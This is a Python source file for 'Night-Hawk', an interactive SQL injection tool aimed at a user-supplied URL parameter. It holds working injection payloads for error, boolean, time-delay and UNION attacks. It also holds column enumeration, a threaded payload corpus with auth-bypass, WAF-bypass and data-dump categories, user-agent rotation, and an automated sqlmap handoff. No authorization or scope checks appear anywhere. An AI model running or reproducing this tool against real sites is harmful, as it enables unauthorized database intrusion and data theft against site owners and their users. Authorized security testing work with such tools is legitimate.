#!/usr/bin/env python3
# ============================================================
#  Night-Hawk :: SQL Injection
#  Interactive SQLi prober: fingerprint, boolean, time, union,
#  corpus run, cheat sheet, sqlmap handoff, report export.
# ============================================================
import os
import re
import sys
import time
import random
import shutil
import subprocess
import threading
from collections import namedtuple
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
from urllib.error import HTTPError
from urllib.parse import quote, parse_qsl, urlencode, urlparse, urlunparse
from urllib.request import Request, urlopen

RED = "\033[1;31m"
DIM = "\033[2;31m"
RST = "\033[0m"

HERE = os.path.dirname(os.path.abspath(__file__))
PAYLOAD_FILE = os.path.join(HERE, "sql_payloads.sql")

ART = r"""
 $$$$$$\   $$$$$$\  $$\       
$$  __$$\ $$  __$$\ $$ |      
$$ /  \__|$$ /  $$ |$$ |      
\$$$$$$\  $$ |  $$ |$$ |      
 \____$$\ $$ |  $$ |$$ |      
$$\   $$ |$$ $$\$$ |$$ |      
\$$$$$$  |\$$$$$$ / $$$$$$$$\ 
 \______/  \___$$$\ \________|
               \___|          
"""

UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
]

SIGNATURES = {
    "MySQL": [
        "you have an error in your sql syntax",
        "warning: mysql",
        "mysql_fetch_array",
        "mysql_num_rows",
        "supplied argument is not a valid mysql",
        "check the manual that corresponds to your mysql",
    ],
    "MariaDB": [
        "mariadb",
        "check the manual that corresponds to your mariadb",
    ],
    "PostgreSQL": [
        "pg_query",
        "pg_exec",
        "postgresql",
        "psql:",
        "unterminated quoted string at or near",
        "syntax error at or near",
    ],
    "MSSQL": [
        "microsoft ole db provider for sql server",
        "odbc sql server driver",
        "unclosed quotation mark",
        "incorrect syntax near",
        "microsoft sql native client",
        "sqlserver jdbc driver",
    ],
    "Oracle": [
        "ora-0",
        "oracle error",
        "quoted string not properly terminated",
        "oracle.jdbc",
        "ora-00933",
    ],
    "SQLite": [
        "sqlite3::",
        "sqlite error",
        "unrecognized token",
        "sqlite_master",
        'near "',
    ],
    "Access": [
        "microsoft jet database engine",
        "jet database",
        "syntax error in query expression",
    ],
    "DB2": [
        "db2 sql error",
        "com.ibm.db2",
        "cli driver",
    ],
}

TIME_PAYLOADS = {
    "MySQL": ["' AND SLEEP(3)-- -", "' AND (SELECT 5 FROM (SELECT SLEEP(3))x)-- -"],
    "MariaDB": ["' AND SLEEP(3)-- -"],
    "PostgreSQL": ["' AND 1=(SELECT 1 FROM PG_SLEEP(3))-- -", "';SELECT PG_SLEEP(3)-- -"],
    "MSSQL": ["';WAITFOR DELAY '0:0:3'-- -"],
    "Oracle": ["' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('x',3)-- -"],
    "SQLite": ["' AND 1=(SELECT 1 FROM (SELECT 1))-- -"],
}

Result = namedtuple("Result", "status length elapsed body err")

_print_lock = threading.Lock()


# ------------------------------------------------------------
# output helpers
# ------------------------------------------------------------
def log(msg, hot=False):
    with _print_lock:
        stamp = f"{DIM}[{time.strftime('%H:%M:%S')}]{RST} "
        print(stamp + RED + msg + RST, flush=True)


def head(title):
    print()
    print(RED + "=" * 62 + RST)
    print(RED + f"  {title}" + RST)
    print(RED + "=" * 62 + RST)


def pause():
    input(f"\n{DIM}Press ENTER to continue...{RST}")


# ------------------------------------------------------------
# payload corpus
# ------------------------------------------------------------
def load_payloads(path=PAYLOAD_FILE):
    cats, cur = {}, None
    if not os.path.exists(path):
        return cats
    with open(path, encoding="utf-8", errors="ignore") as fh:
        for raw in fh:
            line = raw.rstrip("\n").rstrip("\r")
            if not line.strip():
                continue
            if line.startswith("#CATEGORY:"):
                cur = line.split(":", 1)[1].strip().upper()
                cats.setdefault(cur, [])
                continue
            if line == "#":
                if cur:
                    cats[cur].append("#")
                continue
            if line.startswith("# "):
                continue
            if cur:
                cats[cur].append(line)
    return cats


def match_dbms(body):
    low = body.lower()
    for dbms, needles in SIGNATURES.items():
        for needle in needles:
            if needle in low:
                return dbms
    return None


# ------------------------------------------------------------
# target
# ------------------------------------------------------------
class Target:
    def __init__(self, url, cookie="", timeout=12):
        parts = urlparse(url)
        if not parts.query:
            raise ValueError("URL must contain a query string (e.g. page.php?id=1)")
        self.parts = parts
        self.pairs = parse_qsl(parts.query, keep_blank_values=True)
        self.cookie = cookie.strip()
        self.timeout = timeout
        self.ua = random.choice(UAS)
        self.param = self.pairs[0][0]

    def params(self):
        return [k for k, _ in self.pairs]

    def set_param(self, name):
        if name not in self.params():
            raise ValueError("unknown parameter")
        self.param = name

    def build(self, payload):
        pairs = [(k, payload if k == self.param else v) for k, v in self.pairs]
        query = urlencode(pairs, quote_via=quote, safe="")
        return urlunparse(self.parts._replace(query=query))

    def fetch(self, payload):
        url = self.build(payload)
        req = Request(url, headers={
            "User-Agent": self.ua,
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "Connection": "close",
        })
        if self.cookie:
            req.add_header("Cookie", self.cookie)
        t0 = time.perf_counter()
        try:
            with urlopen(req, timeout=self.timeout) as resp:
                body = resp.read(300000).decode("utf-8", "ignore")
                status = resp.status
        except HTTPError as exc:
            try:
                body = exc.read(300000).decode("utf-8", "ignore")
            except Exception:
                body = ""
            status = exc.code
        except Exception as exc:
            return Result(None, 0, time.perf_counter() - t0, "", type(exc).__name__)
        return Result(status, len(body), time.perf_counter() - t0, body, "")


# ------------------------------------------------------------
# classification
# ------------------------------------------------------------
def diff_reasons(base, res):
    reasons = []
    if res.err:
        return reasons
    if base.status != res.status:
        reasons.append(f"status {base.status} -> {res.status}")
    if base.length and abs(res.length - base.length) > 40:
        reasons.append(f"length {base.length} -> {res.length}")
    db_new = match_dbms(res.body)
    db_old = match_dbms(base.body)
    if db_new and not db_old:
        reasons.append(f"db error signature [{db_new}]")
    if res.elapsed > max(2.5, base.elapsed * 3):
        reasons.append(f"delay {res.elapsed:.2f}s")
    return reasons
# ------------------------------------------------------------
# operations
# ------------------------------------------------------------
def do_fingerprint(state):
    target = state["target"]
    head("FINGERPRINT")

    probes = ["'", '"', "\\", "')", "';", "' "]
    found = {}

    for probe in probes:
        res = target.fetch(probe)
        if res.err:
            log(f"  probe {probe!r:<6} -> {res.err}")
            continue
        dbms = match_dbms(res.body)
        reasons = diff_reasons(state["baseline"], res)
        tag = dbms or ("differs" if reasons else "clean")
        log(f"  probe {probe!r:<6} -> {tag}")
        if dbms:
            found[dbms] = found.get(dbms, 0) + 1

    if found:
        best = max(found, key=found.get)
        state["dbms"] = best
        log(f"\n  DBMS likely: {best} ({found[best]} signature hits)")
        log("  error-based injection: CONFIRMED")
    else:
        log("\n  no DBMS signature leaked")
        log("  try the boolean and time tests instead")

    for cat in ("DB-FINGERPRINT", "MYSQL", "POSTGRESQL", "MSSQL", "ORACLE", "SQLITE"):
        for payload in state["payloads"].get(cat, [])[:3]:
            res = target.fetch(payload)
            if res.err or not diff_reasons(state["baseline"], res):
                continue
            log(f"  useful: {payload}")
            state["findings"].append((cat, payload, "changed response"))
            break

    pause()


def do_boolean_time(state):
    target = state["target"]
    base = state["baseline"]
    head("BOOLEAN & TIME TESTS")

    pairs = [
        ("' AND 1=1-- -", "' AND 1=2-- -"),
        ('" AND 1=1-- -', '" AND 1=2-- -'),
        ("' AND '1'='1", "' AND '1'='2"),
        ("1 AND 1=1", "1 AND 1=2"),
    ]

    for true_p, false_p in pairs:
        rt = target.fetch(true_p)
        rf = target.fetch(false_p)
        if rt.err or rf.err:
            log(f"  {true_p:<22} transport error")
            continue
        gap = abs(rt.length - rf.length)
        true_ok = rt.status == base.status
        verdict = "DIFFERENT" if gap > 25 else "identical"
        log(f"  {true_p:<22} vs {false_p:<22} -> {verdict} (gap {gap})")
        if gap > 25 and true_ok:
            log(f"    boolean-based: CONFIRMED with {true_p!r}")
            state["findings"].append(("BOOLEAN", true_p, f"length gap {gap}"))

    log("\n  time-based probes:")
    cands = TIME_PAYLOADS.get(state["dbms"], [])
    if not cands:
        cands = [p for group in TIME_PAYLOADS.values() for p in group]
    for payload in cands:
        res = target.fetch(payload)
        if res.err:
            log(f"  {payload:<44} {res.err}")
            continue
        verdict = "DELAYED" if res.elapsed >= 2.4 else "no delay"
        log(f"  {payload:<44} {res.elapsed:5.2f}s -> {verdict}")
        if res.elapsed >= 2.4:
            log(f"    time-based: CONFIRMED with {payload!r}")
            state["findings"].append(("TIME", payload, f"{res.elapsed:.2f}s delay"))

    pause()


def do_union(state):
    target = state["target"]
    base = state["baseline"]
    head("UNION COLUMN ENUMERATION")

    cols = 0
    for n in range(1, 26):
        res = target.fetch(f"' ORDER BY {n}-- -")
        if res.err:
            continue
        broke = bool(match_dbms(res.body)) and not match_dbms(base.body)
        if broke or (base.length and abs(res.length - base.length) > 120):
            cols = n - 1
            log(f"  ORDER BY {n} broke the query -> {cols} column(s)")
            break
        log(f"  ORDER BY {n} ok")

    if cols < 1:
        log("  could not determine column count")
        pause()
        return

    nums = ",".join(str(i) for i in range(1, cols + 1))
    res = target.fetch(f"' UNION SELECT {nums}-- -")
    if res.err:
        log(f"  union fetch failed: {res.err}")
        pause()
        return

    reflected = [str(i) for i in range(1, cols + 1)
                 if re.search(rf"(?<!\d){i}(?!\d)", res.body)]

    if reflected:
        payload = f"' UNION SELECT {nums}-- -"
        log(f"  union-based: CONFIRMED — reflected column(s): {', '.join(reflected)}")
        state["findings"].append(("UNION", payload, f"{cols} cols, reflected {reflected}"))
        log(f"  working payload: {payload}")
        log("  swap a reflected column for version(), user(), database()")
    else:
        log("  union executed but nothing reflected (blind union)")

    pause()


def do_corpus(state):
    target = state["target"]
    base = state["baseline"]
    head("PAYLOAD CORPUS RUN")

    order = []
    if state["dbms"]:
        order += [state["dbms"].upper()]
    order += ["BOOLEAN-BASED", "ERROR-BASED", "UNION", "TIME-BASED",
              "AUTH-BYPASS", "WAF-BYPASS / TAMPERS", "EXTRACTION / DUMP"]

    pool, seen = [], set()
    for cat in order:
        for payload in state["payloads"].get(cat, []):
            if payload not in seen:
                seen.add(payload)
                pool.append((cat, payload))

    if not pool:
        log("  no payloads loaded — check sql_payloads.sql")
        pause()
        return

    log(f"  testing {len(pool)} payloads with 10 threads\n")
    hits = [0]

    def run(item):
        cat, payload = item
        res = target.fetch(payload)
        if res.err:
            return
        reasons = diff_reasons(base, res)
        if not reasons:
            return
        hits[0] += 1
        state["findings"].append((cat, payload, "; ".join(reasons)))
        log(f"  [{cat}] {payload}")
        log(f"      -> {'; '.join(reasons)}")

    with ThreadPoolExecutor(max_workers=10) as ex:
        list(ex.map(run, pool))

    log(f"\n  {hits[0]} interesting payload(s) out of {len(pool)}")
    pause()


def do_cheatsheet(state):
    payloads = state["payloads"]
    while True:
        head("PAYLOAD CHEAT SHEET")
        cats = list(payloads.keys())
        for i, cat in enumerate(cats, 1):
            print(f"{RED}  [+] {i}: {cat} ({len(payloads[cat])}){RST}")
        print(f"{RED}  [+] 0: back{RST}")
        pick = input(f"\n{DIM}category: {RST}").strip()
        if pick == "0" or not pick.isdigit():
            return
        idx = int(pick)
        if not 1 <= idx <= len(cats):
            continue
        cat = cats[idx - 1]
        head(cat)
        for payload in payloads[cat]:
            print(f"{RED}  {payload}{RST}")
        print(f"\n{DIM}{len(payloads[cat])} payloads — edit sql_payloads.sql to add more{RST}")
        pause()


def do_sqlmap(state):
    head("SQLMAP HANDOFF")
    binary = shutil.which("sqlmap")
    if not binary:
        log("  sqlmap not found on PATH")
        log("  pip install sqlmap  /  git clone https://github.com/sqlmapproject/sqlmap")
        pause()
        return

    url = urlunparse(state["target"].parts)
    cmd = [binary, "-u", url, "-p", state["target"].param,
           "--batch", "--level", "3", "--risk", "2", "--random-agent"]
    if state["dbms"]:
        cmd += ["--dbms", state["dbms"]]
    if state["target"].cookie:
        cmd += ["--cookie", state["target"].cookie]

    log("  " + " ".join(cmd))
    log("  launching...\n")
    try:
        subprocess.run(cmd, cwd=HERE)
    except KeyboardInterrupt:
        log("\n  sqlmap interrupted")
    pause()


def do_report(state):
    head("EXPORT REPORT")
    if not state["findings"]:
        log("  nothing to export yet — run a test first")
        pause()
        return

    stamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    name = os.path.join(os.path.dirname(HERE), "reports", f"sqli_report_{stamp}.txt")
    with open(name, "w", encoding="utf-8") as fh:
        fh.write("Night-Hawk :: SQL injection report\n")
        fh.write(f"generated : {datetime.now().isoformat(timespec='seconds')}\n")
        fh.write(f"target    : {urlunparse(state['target'].parts)}\n")
        fh.write(f"parameter : {state['target'].param}\n")
        fh.write(f"dbms      : {state['dbms'] or 'unknown'}\n")
        fh.write("=" * 62 + "\n\n")
        for cat, payload, note in state["findings"]:
            fh.write(f"[{cat}] {payload}\n    {note}\n")

    log(f"  written: {os.path.basename(name)} ({len(state['findings'])} findings)")
    pause()


# ------------------------------------------------------------
# main
# ------------------------------------------------------------
def main():
    print(RED + ART + RST)
    print(f"{RED}// error, boolean, time and union based prober{RST}\n")

    state = {"payloads": load_payloads(), "findings": [], "dbms": None, "baseline": None}

    if not state["payloads"]:
        print(f"{RED}[!] sql_payloads.sql missing next to this script{RST}")
        print(f"{DIM}    cheat sheet and corpus modes will be empty{RST}\n")

    url = sys.argv[1] if len(sys.argv) > 1 else input(f"{RED}Target URL (with ?param=value): {RST}").strip()
    if not url:
        return

    try:
        target = Target(url)
    except ValueError as exc:
        print(f"{RED}[!] {exc}{RST}")
        return

    names = target.params()
    if len(names) > 1:
        print(f"{RED}parameters found: {', '.join(names)}{RST}")
        pick = input(f"{DIM}test which one [{names[0]}]: {RST}").strip() or names[0]
        try:
            target.set_param(pick)
        except ValueError:
            print(f"{RED}[!] unknown parameter, using {names[0]}{RST}")

    target.cookie = input(f"{DIM}Cookie header (optional): {RST}").strip()

    log(f"target: {urlunparse(target.parts)}")
    log(f"param : {target.param}")
    log("baseline fetch...")

    base = target.fetch(target.pairs[names.index(target.param)][1])
    if base.err:
        log(f"baseline failed: {base.err}")
        return
    log(f"baseline: HTTP {base.status}, {base.length} bytes, {base.elapsed:.2f}s")
    state["baseline"] = base
    state["target"] = target

    while True:
        print()
        print(RED + "-" * 62 + RST)
        print(f"{RED}  [+] 1: Scan / Fingerprint Target{RST}")
        print(f"{RED}  [+] 2: Boolean & Time Tests{RST}")
        print(f"{RED}  [+] 3: Union Column Enumeration{RST}")
        print(f"{RED}  [+] 4: Payload Corpus Run{RST}")
        print(f"{RED}  [+] 5: Payload Cheat Sheet{RST}")
        print(f"{RED}  [+] 6: Hand off to sqlmap{RST}")
        print(f"{RED}  [+] 7: Export Report{RST}")
        print(f"{RED}  [+] 0: Back{RST}")
        print(RED + "-" * 62 + RST)
        if state["dbms"]:
            print(f"{DIM}  dbms: {state['dbms']} | findings: {len(state['findings'])}{RST}")

        choice = input(f"\n{DIM}select: {RST}").strip()

        if choice == "0":
            return
        elif choice == "1":
            do_fingerprint(state)
        elif choice == "2":
            do_boolean_time(state)
        elif choice == "3":
            do_union(state)
        elif choice == "4":
            do_corpus(state)
        elif choice == "5":
            do_cheatsheet(state)
        elif choice == "6":
            do_sqlmap(state)
        elif choice == "7":
            do_report(state)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{RED}[!] aborted{RST}")
        sys.exit(0)
